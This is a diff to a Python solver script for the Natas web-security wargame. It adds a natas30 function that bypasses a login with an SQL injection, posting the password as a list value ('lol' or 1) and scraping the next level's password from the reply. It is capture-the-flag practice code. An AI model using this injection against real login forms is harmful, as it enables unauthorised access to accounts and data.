@@ -293,7 +293,12 @@ def natas29(url):
     return re.findall(r"([^><{} =:\/\"\n]{32})", response.text)[1]
 
 def natas30(url):
-    pass
+    params={"username": "natas31", "password": ["'lol' or 1",4]}
+    response = requests.post(url, data=params)
+    return re.findall(r"natas31(.{32})", response.text)[0]
+
+def natas31(url):
+     pass
 
 # Main functions
 def next_level(user, password):
